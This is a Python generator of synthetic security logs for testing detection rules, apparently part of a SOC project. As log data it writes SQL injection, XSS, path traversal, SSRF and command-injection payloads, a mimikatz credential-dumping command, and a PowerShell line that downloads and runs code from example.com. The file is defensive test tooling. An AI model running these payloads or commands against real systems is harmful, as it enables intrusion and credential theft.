#!/usr/bin/env python3
"""
Synthetic mock-log generator for PySOC.

Produces five files, all in a single output directory:

* ``auth.log``          — Linux /var/log/auth.log (SSH brute-force burst + benign traffic)
* ``nginx_access.log``  — Nginx access log (SQLi, XSS, path-traversal probes + benign traffic)
* ``apache_access.log`` — Apache combined access log (similar mix)
* ``windows_events.json`` — Windows Security event log export (4624 / 4625 / 4688 records,
                          including encoded-PowerShell process creation)
* ``impossible_travel.jsonl`` — JSON-lines logins for two users, one of which
                          exhibits impossible-travel between two countries

The generator is **deterministic** for a given seed, so test runs are
reproducible.

Threats simulated (all *harmless* — purely synthetic log lines, no
executable code is ever produced):

* SSH brute-force: 8 failed logins for "root" from 203.0.113.5 in 60s, then
  a successful login.
* Web SQLi: ``GET /search?q=' OR '1'='1`` from a single IP, repeated.
* Web XSS: ``GET /search?q=<script>alert(1)</script>``.
* Web path traversal: ``GET /../../etc/passwd``.
* Encoded PowerShell: Windows 4688 with ``powershell -EncodedCommand ...``
  where the base64 decodes to ``Write-Host 'pysoc-test'`` (utterly harmless).
* Mimikatz invocation: 4688 with ``mimikatz.exe sekurlsa::logonpasswords``.
* Impossible travel: user "alice" logs in from US at 14:00 and from CN at
  14:30 — ~12,000 km in 30 minutes.

Usage::

    python data/generator/generate_logs.py --out data/raw --seed 42
"""

from __future__ import annotations

import argparse
import base64
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import List

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BASE_TIME = datetime(2026, 3, 7, 14, 0, 0, tzinfo=timezone.utc)

ATTACKER_IPS = ["203.0.113.5", "203.0.113.6", "203.0.113.7", "198.51.100.42"]
BENIGN_IPS = ["10.0.0.5", "10.0.0.6", "10.0.0.7", "192.168.1.10", "192.168.1.20"]
USERS = ["root", "alice", "bob", "carol", "admin", "ubuntu"]
WEB_PATHS = ["/", "/index.html", "/search", "/api/v1/users", "/login", "/about", "/static/style.css"]
WEB_UAS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "curl/8.4.0",
    "python-requests/2.31.0",
]


# ---------------------------------------------------------------------------
# Linux auth.log
# ---------------------------------------------------------------------------
def _fmt_auth_ts(dt: datetime) -> str:
    """rsyslog-style timestamp: 'Mar  7 14:32:01'."""
    return dt.strftime("%b %e %H:%M:%S")


def _generate_linux_auth(rng: random.Random) -> List[str]:
    """Return a list of auth.log lines (SSH brute-force + benign)."""
    lines: List[str] = []

    # 1) Benign successful SSH logins from internal IPs.
    for i in range(6):
        t = BASE_TIME + timedelta(minutes=i * 3)
        user = rng.choice(USERS[:3])
        ip = rng.choice(BENIGN_IPS)
        lines.append(
            f"{_fmt_auth_ts(t)} web-01 sshd[{10000+i}]: Accepted publickey for {user} "
            f"from {ip} port 51012 ssh2"
        )

    # 2) SSH brute-force burst: 8 failed logins for 'root' from 203.0.113.5.
    for i in range(8):
        t = BASE_TIME + timedelta(minutes=10, seconds=i * 7)
        lines.append(
            f"{_fmt_auth_ts(t)} web-01 sshd[{20000+i}]: Failed password for invalid user root "
            f"from {ATTACKER_IPS[0]} port 51012 ssh2"
        )
    # Successful login after the burst (credential-stuffing success).
    t = BASE_TIME + timedelta(minutes=11, seconds=5)
    lines.append(
        f"{_fmt_auth_ts(t)} web-01 sshd[20008]: Accepted password for root "
        f"from {ATTACKER_IPS[0]} port 51012 ssh2"
    )

    # 3) Random benign failed logins (below threshold — should NOT fire).
    for i in range(3):
        t = BASE_TIME + timedelta(minutes=20, seconds=i * 30)
        user = rng.choice(USERS[2:])
        ip = rng.choice(BENIGN_IPS)
        lines.append(
            f"{_fmt_auth_ts(t)} web-01 sshd[{30000+i}]: Failed password for {user} "
            f"from {ip} port 51012 ssh2"
        )

    # 4) A second brute-force burst against 'admin' from a different IP
    #    (separate burst, should produce its own alert).
    for i in range(6):
        t = BASE_TIME + timedelta(minutes=30, seconds=i * 5)
        lines.append(
            f"{_fmt_auth_ts(t)} web-01 sshd[{40000+i}]: Failed password for invalid user admin "
            f"from {ATTACKER_IPS[1]} port 51012 ssh2"
        )

    return lines


# ---------------------------------------------------------------------------
# Nginx / Apache access logs
# ---------------------------------------------------------------------------
def _fmt_web_ts(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def _generate_web_log(rng: random.Random, source: str) -> List[str]:
    """Generate Nginx/Apache combined-format access log lines.

    ``source`` is "nginx" or "apache" — format is identical; only used to
    tag the lines for documentation.
    """
    lines: List[str] = []

    # 1) Benign traffic
    for i in range(10):
        t = BASE_TIME + timedelta(seconds=i * 12)
        ip = rng.choice(BENIGN_IPS)
        path = rng.choice(WEB_PATHS)
        ua = rng.choice(WEB_UAS)
        status = 200 if path != "/login" else 200
        lines.append(
            f'{ip} - - [{_fmt_web_ts(t)}] "GET {path} HTTP/1.1" {status} 5316 "-" "{ua}"'
        )

    # 2) SQLi probe (multiple payloads from same attacker IP)
    sqli_payloads = [
        "1' OR '1'='1",
        "1 UNION SELECT NULL, username, password FROM users--",
        "admin'--",
        "1; DROP TABLE users",
    ]
    for i, payload in enumerate(sqli_payloads):
        t = BASE_TIME + timedelta(minutes=5, seconds=i * 3)
        ua = rng.choice(WEB_UAS)
        lines.append(
            f'{ATTACKER_IPS[2]} - - [{_fmt_web_ts(t)}] "GET /search?q={payload} HTTP/1.1" 200 64 "-" "{ua}"'
        )

    # 3) XSS probe
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]
    for i, payload in enumerate(xss_payloads):
        t = BASE_TIME + timedelta(minutes=6, seconds=i * 4)
        ua = rng.choice(WEB_UAS)
        lines.append(
            f'{ATTACKER_IPS[2]} - - [{_fmt_web_ts(t)}] "GET /search?q={payload} HTTP/1.1" 200 64 "-" "{ua}"'
        )

    # 4) Path traversal
    traversal_payloads = [
        "../../../../etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
    ]
    for i, payload in enumerate(traversal_payloads):
        t = BASE_TIME + timedelta(minutes=7, seconds=i * 5)
        ua = rng.choice(WEB_UAS)
        lines.append(
            f'{ATTACKER_IPS[3]} - - [{_fmt_web_ts(t)}] "GET {payload} HTTP/1.1" 404 64 "-" "{ua}"'
        )

    # 5) SSRF probe
    t = BASE_TIME + timedelta(minutes=8)
    lines.append(
        f'{ATTACKER_IPS[3]} - - [{_fmt_web_ts(t)}] "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 64 "-" "curl/8.4.0"'
    )

    # 6) Command injection
    t = BASE_TIME + timedelta(minutes=9)
    lines.append(
        f'{ATTACKER_IPS[2]} - - [{_fmt_web_ts(t)}] "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1" 200 64 "-" "curl/8.4.0"'
    )

    return lines


# ---------------------------------------------------------------------------
# Windows events (JSON)
# ---------------------------------------------------------------------------
def _ps_encoded_payload() -> str:
    """Return a base64-encoded (UTF-16LE) harmless PowerShell command."""
    payload = "Write-Host 'pysoc-test: harmless encoded payload'"
    return base64.b64encode(payload.encode("utf-16-le")).decode("ascii")


def _generate_windows_events(rng: random.Random) -> List[dict]:
    """Generate Windows Security event log records (4624 / 4625 / 4688)."""
    records: List[dict] = []
    seq = 1000

    def next_id():
        nonlocal seq
        seq += 1
        return seq

    # 1) Benign successful logons.
    for i in range(4):
        t = BASE_TIME + timedelta(minutes=i)
        records.append({
            "EventID": 4624,
            "TimeCreated": t.isoformat(),
            "Properties": [
                {"Key": "TargetUserName", "Value": rng.choice(USERS[:3])},
                {"Key": "IpAddress", "Value": "::1"},
                {"Key": "LogonType", "Value": 2},
            ],
            "Message": f"An account was successfully logged on. EventID=4624",
        })

    # 2) Windows brute-force (4625 x 7) against 'Administrator' from external IP.
    for i in range(7):
        t = BASE_TIME + timedelta(minutes=12, seconds=i * 4)
        records.append({
            "EventID": 4625,
            "TimeCreated": t.isoformat(),
            "Properties": [
                {"Key": "TargetUserName", "Value": "Administrator"},
                {"Key": "IpAddress", "Value": ATTACKER_IPS[0]},
                {"Key": "LogonType", "Value": 3},
            ],
            "Message": f"An account failed to log on. EventID=4625",
        })

    # 3) Suspicious process: encoded PowerShell.
    t = BASE_TIME + timedelta(minutes=15)
    records.append({
        "EventID": 4688,
        "TimeCreated": t.isoformat(),
        "Properties": [
            {"Key": "SubjectUserName", "Value": "admin"},
            {"Key": "NewProcessName", "Value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            {"Key": "ParentProcessName", "Value": "C:\\Windows\\System32\\cmd.exe"},
            {"Key": "CommandLine", "Value": f"powershell.exe -EncodedCommand {_ps_encoded_payload()}"},
        ],
        "Message": "A new process has been created. EventID=4688",
    })

    # 4) Suspicious process: mimikatz (LOLBin).
    t = BASE_TIME + timedelta(minutes=16)
    records.append({
        "EventID": 4688,
        "TimeCreated": t.isoformat(),
        "Properties": [
            {"Key": "SubjectUserName", "Value": "admin"},
            {"Key": "NewProcessName", "Value": "C:\\Temp\\mimikatz.exe"},
            {"Key": "ParentProcessName", "Value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            {"Key": "CommandLine", "Value": "mimikatz.exe sekurlsa::logonpasswords exit"},
        ],
        "Message": "A new process has been created. EventID=4688",
    })

    # 5) Suspicious parent→child: Word → PowerShell (macro-malware pattern).
    t = BASE_TIME + timedelta(minutes=17)
    records.append({
        "EventID": 4688,
        "TimeCreated": t.isoformat(),
        "Properties": [
            {"Key": "SubjectUserName", "Value": "carol"},
            {"Key": "NewProcessName", "Value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            {"Key": "ParentProcessName", "Value": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"},
            {"Key": "CommandLine", "Value": "powershell.exe -nop -w hidden -c iex(iwr http://example.com/payload)"},
        ],
        "Message": "A new process has been created. EventID=4688",
    })

    return records


# ---------------------------------------------------------------------------
# Impossible travel
# ---------------------------------------------------------------------------
def _generate_impossible_travel() -> List[str]:
    """Generate JSON-lines logins exhibiting impossible travel for 'alice'."""
    events = []
    # alice logs in from US (1.2.3.4 → first octet 1 → US) at 14:00 UTC
    events.append({
        "timestamp": (BASE_TIME + timedelta(minutes=0)).isoformat(),
        "source_type": "json",
        "user_name": "alice",
        "source_ip": "1.2.3.4",  # first octet 1 → US
        "source_geo_country": "US",
        "event_action": "login",
        "event_outcome": "success",
        "auth_method": "password",
    })
    # alice logs in from CN (5.6.7.8 → first octet 5 → CN) at 14:30 UTC
    events.append({
        "timestamp": (BASE_TIME + timedelta(minutes=30)).isoformat(),
        "source_type": "json",
        "user_name": "alice",
        "source_ip": "5.6.7.8",  # first octet 5 → CN
        "source_geo_country": "CN",
        "event_action": "login",
        "event_outcome": "success",
        "auth_method": "password",
    })
    # Benign same-country login for 'bob' — should NOT fire.
    events.append({
        "timestamp": (BASE_TIME + timedelta(minutes=0)).isoformat(),
        "source_type": "json",
        "user_name": "bob",
        "source_ip": "1.2.3.5",  # US
        "source_geo_country": "US",
        "event_action": "login",
        "event_outcome": "success",
        "auth_method": "password",
    })
    events.append({
        "timestamp": (BASE_TIME + timedelta(minutes=20)).isoformat(),
        "source_type": "json",
        "user_name": "bob",
        "source_ip": "1.2.3.6",  # US (same country)
        "source_geo_country": "US",
        "event_action": "login",
        "event_outcome": "success",
        "auth_method": "password",
    })
    return [json.dumps(e) for e in events]


# ---------------------------------------------------------------------------
# Top-level entry point
# ---------------------------------------------------------------------------
def generate_all(out_dir: Path, seed: int = 42) -> dict:
    """Generate all mock log files in ``out_dir``.

    Returns
    -------
    dict
        Mapping ``filename → number_of_lines``.
    """
    rng = random.Random(seed)
    out_dir.mkdir(parents=True, exist_ok=True)

    files = {
        "auth.log": _generate_linux_auth(rng),
        "nginx_access.log": _generate_web_log(rng, "nginx"),
        "apache_access.log": _generate_web_log(rng, "apache"),
        "windows_events.json": _generate_windows_events(rng),
        "impossible_travel.jsonl": _generate_impossible_travel(),
    }

    summary = {}
    for fname, lines in files.items():
        path = out_dir / fname
        if fname.endswith(".json"):
            # Windows events: write as JSON array (pretty-printed).
            path.write_text(json.dumps(lines, indent=2), encoding="utf-8")
            summary[fname] = len(lines)
        else:
            path.write_text("\n".join(lines) + "\n", encoding="utf-8")
            summary[fname] = len(lines)
    return summary


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Generate synthetic mock logs for PySOC.")
    p.add_argument("--out", default="data/raw", help="Output directory.")
    p.add_argument("--seed", type=int, default=42, help="Random seed.")
    args = p.parse_args(argv)
    summary = generate_all(Path(args.out), seed=args.seed)
    print(f"Generated {len(summary)} files in {args.out}:")
    for fname, n in summary.items():
        print(f"  {fname:<28} {n} records")
    return 0


if __name__ == "__main__":
    sys.exit(main())
